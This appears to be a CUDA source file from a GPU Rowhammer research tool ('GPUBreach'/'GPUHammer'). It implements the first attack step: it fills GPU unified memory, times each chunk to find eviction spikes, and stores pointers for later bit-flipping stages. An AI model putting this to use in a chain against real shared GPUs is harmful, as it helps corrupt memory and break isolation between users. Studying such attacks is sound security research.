#include "./s1_allocallmem.cuh"
#include <chrono>
#include <cmath>
#include <cuda.h>
#include <fstream>
#include <iostream>
#include <numeric>
#include <rh_impls.cuh>
#include <rh_kernels.cuh>
#include <rh_utils.cuh>
#include <string>
#include <vector>

uint64_t
alloc_all_mem_test (int argc, char *argv[])
{
  const double threshold = std::stod (argv[0]);
  const uint64_t skip = std::stoull (argv[1]);
  GPUBreachContext ctx;
  ctx.bitflip_config = GPUBreachContext::BitFlipConfig (argv[2]);

  uint8_t *temp;
  size_t total_byte = get_memory_limit ();

  uint64_t chunks = 0;
  int consec_spike = 0;
  int consec_spike_lim = 3;

  // Prefetch RH_Limit amount of memory as we will do in actual attack.
  // Required step for GPUHammer to work.

  // Note: We use 'total_byte' as allocate then prefetching exact amounts
  // effects the allocation.
  int device;
  const uint64_t RH_LIMIT = ctx.bitflip_config.mem_size;
  cudaGetDevice (&device);
  cudaMallocManaged (&temp, total_byte);
  cudaMemPrefetchAsync (temp, RH_LIMIT, device);
  cudaDeviceSynchronize ();

  for (; chunks < total_byte; chunks += ALLOC_SIZE)
    {
      double currentMS = time_data_access (temp, ALLOC_SIZE);
      DBG_OUT << chunks / ALLOC_SIZE << " Recorded time: " << currentMS
              << " ms" << std::endl;

      temp += ALLOC_SIZE;

      // No need to check time for prefetched memory
      if (chunks < RH_LIMIT)
        continue;

      // Look for consecutive spikes, reset if not.
      consec_spike += currentMS > threshold ? 1 : -consec_spike;
      if (consec_spike == consec_spike_lim)
        {
          std::cout << "Spikes observed after allocation index \033[1;31m"
                    << (chunks / ALLOC_SIZE) - consec_spike_lim + 1
                    << "\033[0m" << std::endl;
          std::cout << "This means you should perform at most \033[1m"
                    << (chunks / ALLOC_SIZE) - consec_spike_lim + 1
                    << "\033[0m number of allocations to avoid eviction"
                    << std::endl;
          std::cout << "Pass \033[1;32m"
                    << (chunks / ALLOC_SIZE) - consec_spike_lim + 1
                    << "\033[0m as the limit in subsequent experiments."
                    << std::endl;
          return (chunks / ALLOC_SIZE);
        }
    }
  return 0;
}

bool
alloc_all_mem (int argc, char *argv[])
{
  const uint64_t num_alloc = std::stoll (argv[0]);
  const double threshold = std::stod (argv[1]);
  const uint64_t skip = std::stoull (argv[2]);
  GPUBreachContext ctx;
  ctx.bitflip_config = GPUBreachContext::BitFlipConfig (argv[3]);

  return alloc_all_mem (num_alloc, threshold, skip, ctx);
}

bool
alloc_all_mem (uint64_t num_alloc, double threshold, uint64_t skip,
               GPUBreachContext &ctx)
{
  uint8_t *temp;

  const uint64_t RH_LIMIT = ctx.bitflip_config.mem_size;

  // Note: 'num_alloc' is just for debugging convienience.
  //  This can be inferred dynamically (e.g. in Step 3)
  int device;
  cudaGetDevice (&device);
  cudaMallocManaged (&temp, num_alloc * ALLOC_SIZE);
  cudaMemPrefetchAsync (temp, RH_LIMIT, device);
  cudaDeviceSynchronize ();
  DBG_OUT << (void *)temp << '\n';

  for (uint64_t i = 0; i < num_alloc; i++)
    {
      double currentMS = time_data_access (temp, ALLOC_SIZE);

      // Store each 2MB data as pointers for future use.
      ctx.step1_data.alloc_ptrs.push_back (temp);

      DBG_OUT << i << " Recorded time: " << currentMS << " ms" << (void *)temp
              << std::endl;

      temp += ALLOC_SIZE;
    }
  DBG_OUT << (void*)ctx.step1_data.alloc_ptrs[0] << '\n';

  if (debug_enabled ())
    {
      std::cout << "(Step 1 Done) Memory Allocated to Full: Press "
                   "\033[1;32mEnter Key\033[0m to continue..."
                << '\n';
      paused ();
    }
  else
    {
      std::cout << "(Step 1 Done) Memory Allocated to Full\n";
    }
  return true;
}